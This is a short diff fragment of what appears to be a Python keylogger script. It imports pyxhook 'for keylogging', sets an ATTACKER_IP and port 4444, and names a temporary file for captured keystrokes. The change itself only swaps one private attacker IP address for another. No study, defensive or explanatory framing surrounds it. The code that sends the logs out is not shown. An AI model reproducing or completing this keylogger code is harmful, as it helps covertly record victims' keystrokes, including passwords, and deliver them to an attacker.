@@ -6,7 +6,7 @@ import pyxhook  # For keylogging
 import time
 
 # Configuration: Set the attacker's IP and port
-ATTACKER_IP = '192.168.230.245'  # Replace with the attacker's IP
+ATTACKER_IP = '192.168.2.130'  # Replace with the attacker's IP
 ATTACKER_PORT = 4444
 
 # File to store keylogs temporarily
